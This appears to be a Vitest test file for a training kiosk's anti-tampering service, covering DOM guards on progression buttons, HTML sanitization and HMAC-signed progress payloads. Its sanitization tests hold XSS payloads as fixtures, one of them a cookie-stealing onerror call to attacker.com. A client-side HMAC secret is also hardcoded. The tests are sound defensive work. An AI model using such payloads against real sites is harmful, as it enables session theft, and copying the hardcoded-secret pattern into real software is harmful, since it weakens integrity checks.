import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  AntiTamperingService,
  antiTamperingService,
  SignedStepProgressionPayload
} from '../features/kiosk/services/anti-tampering.service';
import { computeHmacSha256 } from '../features/kiosk/utils/hmac-sha256';

describe('K-SEC-003: Anti-Tampering DOM Guard, Sanitization & Payload Signing', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    antiTamperingService.resetTamperCount();
    antiTamperingService.stopObserving();
  });

  afterEach(() => {
    antiTamperingService.stopObserving();
  });

  // =========================================================================
  // 1. Acceptance Criteria: MutationObserver Anti-Tampering Guard
  // =========================================================================
  describe('Acceptance Criteria: Progression Button Unlock Trapping', () => {
    it('Given an injected script attempting to remove the disabled attribute from an incomplete step button, When modified, Then the mutation guard catches the change and enforces button lock', () => {
      const guard = new AntiTamperingService();
      const onTamperDetectedSpy = vi.fn();
      const onResetStepStateSpy = vi.fn();

      // Create mock DOM button
      const attributes: Record<string, string> = {
        id: 'kiosk-btn-next',
        disabled: 'true',
        'aria-disabled': 'true',
        'data-tamper-guard': 'progression'
      };

      const mockButton: any = {
        id: 'kiosk-btn-next',
        nodeType: 1,
        disabled: true,
        getAttribute: (name: string) => attributes[name] || null,
        setAttribute: (name: string, val: string) => {
          attributes[name] = val;
          if (name === 'disabled') mockButton.disabled = true;
        },
        removeAttribute: (name: string) => {
          delete attributes[name];
          if (name === 'disabled') mockButton.disabled = false;
        },
        hasAttribute: (name: string) => Boolean(attributes[name]),
        classList: {
          add: vi.fn(),
          remove: vi.fn()
        }
      };

      // Set up guard monitoring incomplete step
      const options = {
        canProgress: () => false, // Incomplete step
        onTamperDetected: onTamperDetectedSpy,
        onResetStepState: onResetStepStateSpy
      };

      (guard as any).currentOptions = options;

      // Simulate malicious script stripping 'disabled' attribute
      mockButton.removeAttribute('disabled');
      expect(mockButton.hasAttribute('disabled')).toBe(false);
      expect(mockButton.disabled).toBe(false);

      // Simulate mutation notification
      const mutationRecord: any = {
        type: 'attributes',
        target: mockButton,
        attributeName: 'disabled'
      };

      guard.handleMutations([mutationRecord]);

      // Guard catches the change and enforces button lock
      expect(mockButton.hasAttribute('disabled')).toBe(true);
      expect(mockButton.disabled).toBe(true);
      expect(mockButton.getAttribute('aria-disabled')).toBe('true');
      expect(mockButton.getAttribute('data-tamper-enforced')).toBe('true');

      // Verify callbacks
      expect(onTamperDetectedSpy).toHaveBeenCalledTimes(1);
      expect(onTamperDetectedSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'BUTTON_UNLOCK_ATTEMPT',
          target: mockButton,
          attributeName: 'disabled'
        })
      );
      expect(onResetStepStateSpy).toHaveBeenCalledTimes(1);
      expect(guard.getTamperCount()).toBe(1);
    });

    it('catches tampering on Finish button (#kiosk-btn-finish) and re-enforces lock', () => {
      const guard = new AntiTamperingService();
      const onTamperDetectedSpy = vi.fn();

      const attributes: Record<string, string> = {
        id: 'kiosk-btn-finish',
        disabled: 'true',
        'aria-disabled': 'true'
      };

      const mockFinishBtn: any = {
        id: 'kiosk-btn-finish',
        nodeType: 1,
        disabled: true,
        getAttribute: (name: string) => attributes[name] || null,
        setAttribute: (name: string, val: string) => {
          attributes[name] = val;
          if (name === 'disabled') mockFinishBtn.disabled = true;
        },
        removeAttribute: (name: string) => {
          delete attributes[name];
          if (name === 'disabled') mockFinishBtn.disabled = false;
        },
        hasAttribute: (name: string) => Boolean(attributes[name]),
        classList: { add: vi.fn() }
      };

      (guard as any).currentOptions = {
        canProgress: () => false,
        onTamperDetected: onTamperDetectedSpy
      };

      // Strip disabled
      mockFinishBtn.removeAttribute('disabled');

      guard.handleMutations([
        {
          type: 'attributes',
          target: mockFinishBtn,
          attributeName: 'disabled'
        } as any
      ]);

      expect(mockFinishBtn.hasAttribute('disabled')).toBe(true);
      expect(mockFinishBtn.disabled).toBe(true);
      expect(onTamperDetectedSpy).toHaveBeenCalled();
    });

    it('allows disabled removal when step is legitimately complete without triggering tamper alert', () => {
      const guard = new AntiTamperingService();
      const onTamperDetectedSpy = vi.fn();

      const attributes: Record<string, string> = {
        id: 'kiosk-btn-next'
      };

      const mockBtn: any = {
        id: 'kiosk-btn-next',
        nodeType: 1,
        disabled: false,
        getAttribute: (name: string) => attributes[name] || null,
        setAttribute: vi.fn(),
        hasAttribute: (name: string) => Boolean(attributes[name]),
        classList: { add: vi.fn() }
      };

      // canProgress is TRUE (e.g. video finished or quiz passed)
      (guard as any).currentOptions = {
        canProgress: () => true,
        onTamperDetected: onTamperDetectedSpy
      };

      guard.handleMutations([
        {
          type: 'attributes',
          target: mockBtn,
          attributeName: 'disabled'
        } as any
      ]);

      expect(onTamperDetectedSpy).not.toHaveBeenCalled();
      expect(guard.getTamperCount()).toBe(0);
      expect(mockBtn.setAttribute).not.toHaveBeenCalled();
    });

    it('detects injected progression nodes in childList and enforces lock if step incomplete', () => {
      const guard = new AntiTamperingService();
      const onTamperDetectedSpy = vi.fn();

      const attributes: Record<string, string> = {
        id: 'kiosk-btn-next'
      };

      const injectedBtn: any = {
        id: 'kiosk-btn-next',
        nodeType: 1,
        disabled: false,
        getAttribute: (name: string) => attributes[name] || null,
        setAttribute: (name: string, val: string) => {
          attributes[name] = val;
          if (name === 'disabled') injectedBtn.disabled = true;
        },
        hasAttribute: (name: string) => Boolean(attributes[name]),
        classList: { add: vi.fn() }
      };

      (guard as any).currentOptions = {
        canProgress: () => false,
        onTamperDetected: onTamperDetectedSpy
      };

      guard.handleMutations([
        {
          type: 'childList',
          target: { nodeType: 1, id: 'kiosk-action-footer' },
          addedNodes: [injectedBtn]
        } as any
      ]);

      expect(injectedBtn.hasAttribute('disabled')).toBe(true);
      expect(injectedBtn.disabled).toBe(true);
      expect(onTamperDetectedSpy).toHaveBeenCalled();
    });
  });

  // =========================================================================
  // 2. DOMPurify Input Sanitization
  // =========================================================================
  describe('DOMPurify Text & HTML Block Sanitization', () => {
    it('strips malicious <script> tags from content blocks', () => {
      const maliciousHtml = '<p>Safety First</p><script>alert("XSS-ATTACK")</script>';
      const sanitized = antiTamperingService.sanitizeHtml(maliciousHtml);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert("XSS-ATTACK")');
      expect(sanitized).toContain('Safety First');
    });

    it('strips inline event handlers such as onerror and onclick', () => {
      const maliciousHtml = '<img src="invalid.jpg" onerror="fetch(\'http://attacker.com/leak?cookie=\'+document.cookie)" /><strong>Protective Gear</strong>';
      const sanitized = antiTamperingService.sanitizeHtml(maliciousHtml);

      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('attacker.com');
      expect(sanitized).toContain('Protective Gear');
    });

    it('strips malicious javascript: pseudo-protocol URIs in anchors', () => {
      const maliciousHtml = '<a href="javascript:document.location=\'http://phish.com\'">Click for manual</a>';
      const sanitized = antiTamperingService.sanitizeHtml(maliciousHtml);

      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('Click for manual');
    });

    it('strips <iframe> injection attempts', () => {
      const maliciousHtml = '<iframe src="http://malicious.com/overlay"></iframe><span>Inspect PPE</span>';
      const sanitized = antiTamperingService.sanitizeHtml(maliciousHtml);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).toContain('Inspect PPE');
    });

    it('preserves valid and safe formatting tags (b, strong, p, span, em, ul, li)', () => {
      const safeHtml = '<p>Wear <strong>safety goggles</strong> and <em>heat-resistant gloves</em>.</p>';
      const sanitized = antiTamperingService.sanitizeHtml(safeHtml);

      expect(sanitized).toContain('<strong>safety goggles</strong>');
      expect(sanitized).toContain('<em>heat-resistant gloves</em>');
    });

    it('handles empty or non-string inputs gracefully', () => {
      expect(antiTamperingService.sanitizeHtml('')).toBe('');
      expect(antiTamperingService.sanitizeHtml(null as any)).toBe('');
      expect(antiTamperingService.sanitizeHtml(undefined as any)).toBe('');
    });
  });

  // =========================================================================
  // 3. HMAC Payload Signing & Client Monotonic Timers
  // =========================================================================
  describe('HMAC Payload Signing with Client Monotonic Timers', () => {
    it('initializes monotonic session timer and computes signed progression payload', () => {
      const sessionId = 'session-mono-100';
      antiTamperingService.initSessionMonotonicTimer(sessionId);

      const payload = {
        sessionId,
        currentStepId: 'step-02',
        completedStepId: 'step-01',
        completedStepIds: ['step-01'],
        durationSeconds: 25
      };

      const signed = antiTamperingService.signStepProgressionPayload(payload);

      expect(signed.sessionId).toBe(sessionId);
      expect(signed.currentStepId).toBe('step-02');
      expect(signed.completedStepId).toBe('step-01');
      expect(signed.durationSeconds).toBe(25);
      expect(typeof signed.timestamp).toBe('number');
      expect(typeof signed.monotonicElapsedMs).toBe('number');
      expect(signed.monotonicElapsedMs).toBeGreaterThanOrEqual(0);
      expect(signed.hmacSignature).toBeDefined();
      expect(signed.hmacSignature.length).toBe(64); // SHA-256 hex is 64 characters
    });

    it('verifies a valid signed progression payload successfully', () => {
      const sessionId = 'session-mono-200';
      antiTamperingService.initSessionMonotonicTimer(sessionId);

      const signed = antiTamperingService.signStepProgressionPayload({
        sessionId,
        currentStepId: 'step-03',
        completedStepId: 'step-02',
        durationSeconds: 40
      });

      const verification = antiTamperingService.verifyStepProgressionPayload(signed);
      expect(verification.valid).toBe(true);
      expect(verification.reason).toBeUndefined();
    });

    it('rejects forged payload with tampered step ID', () => {
      const sessionId = 'session-mono-300';
      antiTamperingService.initSessionMonotonicTimer(sessionId);

      const signed = antiTamperingService.signStepProgressionPayload({
        sessionId,
        currentStepId: 'step-02',
        completedStepId: 'step-01',
        durationSeconds: 15
      });

      // Attacker tampers with currentStepId to skip to final step
      const forgedPayload: SignedStepProgressionPayload = {
        ...signed,
        currentStepId: 'step-final-skip'
      };

      const verification = antiTamperingService.verifyStepProgressionPayload(forgedPayload);
      expect(verification.valid).toBe(false);
      expect(verification.reason).toBe('INVALID_HMAC_SIGNATURE');
    });

    it('detects monotonic clock drift when client system clock is manipulated', () => {
      const sessionId = 'session-mono-400';
      const timer = antiTamperingService.initSessionMonotonicTimer(sessionId);

      const signed = antiTamperingService.signStepProgressionPayload({
        sessionId,
        currentStepId: 'step-02',
        completedStepId: 'step-01',
        durationSeconds: 10
      });

      // Simulate client wall clock jumping forward 1 hour while monotonic elapsed is only 10 seconds
      const clockTamperedPayload: SignedStepProgressionPayload = {
        ...signed,
        timestamp: timer.startWallTime + 3600 * 1000, // +1 hour wall time
        monotonicElapsedMs: 10 * 1000 // Only 10s monotonic elapsed
      };

      // Re-sign to isolate the monotonic drift check
      const canonicalMessage = [
        clockTamperedPayload.sessionId,
        clockTamperedPayload.currentStepId,
        clockTamperedPayload.completedStepId || '',
        clockTamperedPayload.monotonicElapsedMs,
        clockTamperedPayload.timestamp
      ].join(':');

      const tamperedWithValidHmac = {
        ...clockTamperedPayload,
        hmacSignature: (antiTamperingService as any).computeHmac
          ? (antiTamperingService as any).computeHmac(canonicalMessage)
          : signed.hmacSignature
      };

      // Drift is 3590000ms >> 5000ms maxDrift
      const verification = antiTamperingService.verifyStepProgressionPayload(
        tamperedWithValidHmac,
        undefined,
        5000
      );

      expect(verification.valid).toBe(false);
      expect(verification.reason).toBeDefined();
    });

    it('rejects payload if timestamp precedes session start time', () => {
      const sessionId = 'session-mono-500';
      const timer = antiTamperingService.initSessionMonotonicTimer(sessionId);

      const invalidPayload: SignedStepProgressionPayload = {
        sessionId,
        currentStepId: 'step-02',
        timestamp: timer.startWallTime - 5000, // Time traveler: precedes session start
        sessionStartTime: timer.startWallTime,
        monotonicElapsedMs: 100,
        hmacSignature: 'dummy'
      };

      // Compute valid signature for the canonical representation
      const canonical = [
        invalidPayload.sessionId,
        invalidPayload.currentStepId,
        '',
        invalidPayload.monotonicElapsedMs,
        invalidPayload.timestamp
      ].join(':');

      const signedInvalid = {
        ...invalidPayload,
        hmacSignature: computeHmacSha256(
          'talnova-monotonic-integrity-secret-v1',
          canonical
        )
      };

      const verification = antiTamperingService.verifyStepProgressionPayload(signedInvalid);
      expect(verification.valid).toBe(false);
      expect(verification.reason).toBe('TIMESTAMP_PRECEDES_SESSION_START');
    });
  });
});
